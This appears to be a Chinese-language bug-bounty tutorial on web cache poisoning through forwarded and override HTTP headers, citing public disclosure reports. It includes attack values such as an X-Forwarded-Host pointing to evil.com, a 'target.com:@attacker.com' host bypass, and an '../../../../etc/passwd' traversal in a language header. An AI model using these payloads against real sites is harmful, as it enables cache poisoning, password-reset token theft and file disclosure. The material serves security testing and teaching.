一. Header 转发

X-Forwarded-Host：

1：双重解析绕过

某些应用解析 X-Forwarded-Host 两次——一次在 CDN 层，一次在应用层。

  • CDN 读取第一个值：legitimate.target.com ✅ 允许
  • 应用读取最后一个值：evil.com ⚠️ 已注入
  • 缓存键使用：第一个值（CDN 的决定）
  • 响应反射：最后一个值（应用的决定）

真实案例：此模式类似于 HackerOne 报告 #487 中发现的情况，这是在 HackerOne 本身发现的最早的缓存投毒漏洞之一，其中 X-Forwarded-Host Header 在没有验证的情况下被信任。

2：端口注入绕过

WAF 通常检查 X-Forwarded-Host 是否匹配允许的域名，但忘记了端口规范。

  • 浏览器将 target.com:@attacker.com 解释为以 target.com: 为用户名的 attacker.com
  • WAF 看到 “target.com” 子串并允许它
  • 生成的 URL 变为：https://target.com:@attacker.com/path

真实案例：类似技术记录在 Shopify 的缓存投毒报告 #977851 中，其中 X-Forwarded-Host 被利用来投毒缓存页面。

3：Unicode 同形字混淆

注意西里尔字母 ‘а’（U+0430）代替拉丁字母 ‘a’。某些应用规范化 Unicode 而缓存不这样做，创建键碰撞。

测试策略 — 测试这些 Unicode 看起来相似的字符：

  • 拉丁 ‘a’ vs 西里尔 ‘а’（U+0430）
  • 拉丁 ‘o’ vs 西里尔 ‘о’（U+043E）
  • 拉丁 ‘e’ vs 西里尔 ‘е’（U+0435）
  • 拉丁 ‘p’ vs 西里尔 ‘р’（U+0440）

X-Forwarded-Scheme：协议操纵

此 Header 告诉后端客户端使用的协议。它应该由 CDN 设置，但许多应用盲目信任它。

1：强制 HTTPS 降级

影响：

  • 应用生成 http:// 而非 https:// 的 URL
  • 没有 Secure 标志的 Cookie 变得可访问
  • 用户出现混合内容警告
  • 某些配置下绕过 HSTS

真实案例：在 Youstin 的”大规模缓存投毒”研究 中，X-Forwarded-Scheme Header 被成功用于在 Ruby on Rails 应用上造成重定向循环，获得多个赏金，包括 HackerOne 的 $2,500。

2：协议混淆链

如果应用盲目信任这些 Header：

当 URL 用于重定向或 href 属性时，这会创建 XSS 向量。

X-Forwarded-Port：覆盖被遗忘的端口

此 Header 指定客户端连接的端口。应用将其用于 URL 生成，这就是事情变得有趣的地方。

1：基于端口的缓存投毒

场景：

  • 应用生成资源 URL：https://target.com:8080/assets/app.js
  • 普通用户无法加载这些 URL（端口 8080 未暴露）
  • 由于缺少 JavaScript，整个应用崩溃

真实案例：HackerOne 报告 #409370 演示了 X-Forwarded-Port 如何通过将用户重定向到无效端口，在 HackerOne.com 本身造成 DoS。

根据 URL 解析，这可能生成：https://target.com:80@evil.com:443/path

Forwarded Header：RFC 7239 利用

当所有人都在测试 X-Forwarded-* 时，标准化的 Forwarded Header（定义在 RFC 7239 中）经常被忽视。

  • 更结构化的格式可以绕过简单的正则过滤器
  • 一个 Header 中包含多个参数
  • 可以混合合法和恶意值

1：参数注入

应用可能取第一个 host 值进行验证，取第二个用于 URL 生成。

二. URL 操纵 Header

X-Original-URL：IIS

此 Header 专为 IIS URL 重写设计，但现在被许多框架处理。它极其强大，因为它可以覆盖整个请求路径。

1：路径覆盖缓存投毒

  • 缓存键基于：/public/cached-page 生成
  • 应用处理：/admin/sensitive-data
  • 管理员响应被缓存在公开端点

真实案例：James Kettle 的研究在 “Web Cache Entanglement” 中记录了类似的路径覆盖攻击，路径操纵在多个平台上导致了关键漏洞。

2：通过路径混淆的认证绕过

如果认证基于路径且仅检查实际请求路径，这就能绕过它。

缓存认为它在提供图片。应用返回 API 密钥。

X-Rewrite-URL：Apache

类似于 X-Original-URL，但某些框架的处理方式不同。

1：双重路径处理

测试优先级 — 不同框架有不同的 Header 优先级：

  • Apache mod_rewrite：X-Rewrite-URL 优先
  • IIS：X-Original-URL 优先
  • Nginx：默认都不使用（自定义配置）
  • Express.js：取决于中间件顺序

Tip：始终同时和单独测试两个 Header。框架更新会改变优先级。

X-Forwarded-Prefix：路径前缀

此 Header 为所有生成的 URL 添加前缀。它适用于在子目录中运行的反向代理后面的应用。

生成的 URL：

影响：

  • 资源 URL 中的相对路径遍历
  • 可以指向攻击者控制的子域名
  • 如果实施不当会破坏 CSP

真实案例：类似的路径操纵技术详见 Snyk 关于开源包中缓存投毒的研究，在 Flask、Bottle 和其他流行框架中发现了漏洞。

三. Host 操纵 Header

X-Host：替代 Host

当 X-Forwarded-Host 被阻止时，X-Host 经常能悄无声息地通过。

支持 X-Host 的框架：

  • Symfony（带信任代理配置）
  • Laravel（在受信任代理后面）
  • Django（带 SECURE_PROXY_SSL_HEADER）
  • Flask（带 ProxyFix 中间件）

攻击场景：

密码重置邮件包含：https://attacker.com/reset?token=SECRET

X-Forwarded-Server：主机名覆盖

此 Header 指定原始服务器主机名。应用有时将其用于日志记录或 URL 生成。

如果应用将其用于日志记录且日志可访问（通过 SSRF、路径遍历等），你就注入了日志。这可以实现：

  • 日志注入攻击
  • 日志系统中的 CRLF 注入
  • 如果日志在管理面板中显示，可实现二阶 XSS

X-HTTP-Host-Override：框架特定 Header

某些框架使用自定义 Header 进行 Host 覆盖：

要测试的框架特定 Header：

  • X-HTTP-Host-Override（通用中间件）
  • X-ProxyUser-Ip（IBM WebSphere）
  • X-Forwarded-By（自定义实现）
  • X-Backend-Server（负载均衡器特定）
  • X-Server-Name（Apache mod_proxy）

开发者实现自定义代理逻辑时没有进行适当验证。

四. Content操纵 Header

X-Content-Type-Options：MIME 混淆

虽然不能直接注入，但操纵它可以增强缓存投毒的影响。

影响：

  • 强制严格 MIME 类型检查
  • 可以破坏依赖 MIME 嗅探的应用
  • 结合缓存投毒，可以破坏整个站点

Accept-Encoding：压缩混淆

测试方向：

  • 响应中的编码反射
  • 基于编码的缓存键变体
  • 不同编码的不同缓存桶

真实攻击模式：

进阶：某些缓存规范化 Accept-Encoding，其他则不这样做。这创造了选择性投毒机会。了解更多请阅读 PortSwigger 的 “Gotta Cache ‘Em All” 研究论文。

五. 本地化 Header

Accept-Language：

攻击策略：

  • 投毒特定语言缓存
  • 英语用户获得干净缓存
  • 西班牙语用户获得有毒缓存
  • 更难检测和复现

真实案例：Glassdoor 的 Web 缓存投毒报告 #1424094 展示了特定语言的缓存如何导致跨不同页面的 CSRF Token 泄露和 XSS。

X-Forwarded-Language：自定义语言

某些应用使用自定义 Header 进行语言选择：

测试方向：

  • 语言参数中的 SQL 注入
  • 特定语言内容中的 XSS
  • 路径遍历：X-Forwarded-Language: ../../../../etc/passwd

六. 移动设备 Header

X-Forwarded-Device：移动端

  • 移动缓存是独立的
  • 移动端点监控较少
  • 移动端不同的 CSP 策略
  • 移动端不同的 URL 资源

X-Requested-With：AJAX 缓存投毒

影响：

  • API 响应被投毒
  • JavaScript 应用崩溃
  • CORS 错误级联
  • 静默失败难以调试

额外攻击：

如果反射到响应 Header 或 CORS 检查中，那就是 XSS。

七. 认证 Header

X-Forwarded-User：用户欺骗

如果被信任：

  • 访问其他用户的个人资料
  • 提升权限
  • 为普通用户缓存管理员响应

X-Auth-Token：Token 注入

测试方向：

  • 响应中的 Token 反射
  • 通过缓存的 Token 泄露
  • Token 验证绕过

八. CloudFront 特定 Header

CloudFront-Forwarded-Proto：AWS 特定攻击

类似于 X-Forwarded-Proto，但专用于 AWS CloudFront。

CloudFront-Viewer-Country：地理定向绕过

攻击：

  • 绕过地理限制
  • 投毒特定国家缓存
  • 访问地区锁定内容

九. 自定义应用 Header

框架特定 Header

每个主要框架都有开发者未意识到可被利用的 Header：

Laravel：

  • X-CSRF-Token（可导致缓存）
  • X-Socket-ID（WebSocket 混淆）

Django：

  • X-CSRFToken（可导致缓存）
  • X-Forwarded-Protocol（协议覆盖）

Express.js：

  • X-Forwarded-*（取决于信任代理配置）

Spring Boot：

  • X-Forwarded-Prefix（路径操纵）
  • X-Forwarded-Context（上下文覆盖）

Ruby on Rails：根据 Youstin 的研究，Rails 应用通常采用 X-Forwarded-Scheme，使其容易受到重定向循环 DoS 攻击。

十一. 已获得赏金的Header 组合

组合 1：Mozilla Firefox Shield 攻击

研究者：James Kettle
目标：Mozilla Firefox Shield
使用的 Header：

  • X-Forwarded-Host: attacker-controlled.com
  • Origin: null

影响：可能强制全球 5000 万 Firefox 浏览器安装有漏洞的扩展
赏金：$1,000（24 小时内修复）
来源：PortSwigger Research

组合 2：HackerOne DoS 攻击

报告：#409370
使用的 Header：

  • X-Forwarded-Port: 123
  • X-Forwarded-Host: evil.com

影响：HackerOne 重定向的持久性 DoS
赏金：已公开披露

组合 3：Data.gov 篡改

报告：#303730
使用的 Header：

  • X-Forwarded-Host: evil.com

影响：catalog.data.gov 的 XSS 和篡改
发现：服务器未经验证信任 X-Forwarded-Host Header

组合 4：Acronis 缓存投毒

报告：#1010858
使用的 Header：

  • X-Forwarded-Port: 0

影响：可以用恶意响应破坏缓存
模式：端口操纵破坏 URL 生成

组合 5：Shopify 路径混淆

报告：#1695604
攻击向量：反斜杠 vs 正斜杠差异
影响：通过缓存投毒造成 DoS
洞察：CDN 将 \ 和 / 视为等效，而源服务器返回 404

缓存状态含义：

  • HIT：从缓存提供响应 ✅
  • MISS：来自源服务器，现已缓存
